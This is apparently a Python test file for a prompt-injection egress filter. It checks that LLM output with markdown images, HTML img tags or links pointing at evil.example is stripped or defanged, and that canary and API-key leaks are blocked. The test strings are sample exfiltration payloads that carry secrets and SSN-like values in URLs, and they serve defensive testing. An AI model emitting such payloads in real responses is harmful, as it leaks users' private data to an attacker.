from prompt_injection.egress import EgressFilter
from prompt_injection.segment import SessionContext

F = EgressFilter(allowed_domains=["docs.mycompany.com"])
CTX = SessionContext("s")


def test_external_markdown_image_removed():
    r = F.check_output("Done! ![loading](https://evil.example/p.png?d=SECRET123)", CTX)
    assert "evil.example" not in r.text
    assert any("external_image_removed" in f for f in r.findings)


def test_allowlisted_image_kept():
    md = "![diagram](https://docs.mycompany.com/a.png)"
    assert F.check_output(md, CTX).text == md


def test_subdomain_spoof_not_allowlisted():
    r = F.check_output("![x](https://docs.mycompany.com.evil.example/a.png)", CTX)
    assert "evil" not in r.text


def test_link_from_context_kept_novel_link_defanged():
    ctx = SessionContext("s", untrusted_texts=["Source: https://en.wikipedia.org/wiki/Paris"])
    assert F.check_output("See [Wikipedia](https://en.wikipedia.org/wiki/Paris)", ctx).findings == []
    r = F.check_output("Click [here](https://evil.example/?q=user_ssn_123)", ctx)
    assert "user_ssn" not in r.text and "here (evil.example)" in r.text


def test_data_in_url_path_removed():
    r = F.check_output("[source](https://evil.example/u/ssn-123-45-6789)", CTX)
    assert "6789" not in r.text


def test_html_img_removed():
    r = F.check_output('<img src="https://evil.example/x?d=1">', CTX)
    assert "evil" not in r.text


def test_reference_style_image_removed():
    r = F.check_output("![a][1]\n\n[1]: https://evil.example/?d=x", CTX)
    assert "evil" not in r.text


def test_canary_leak_blocks():
    r = F.check_output(f"My instructions say {CTX.canary}", CTX)
    assert r.blocked


def test_secret_in_output_blocks():
    r = F.check_output("key: sk-proj-abcdefghijklmnopqrstuvwxyz123456", CTX)
    assert r.blocked and "secret:openai_key" in r.findings
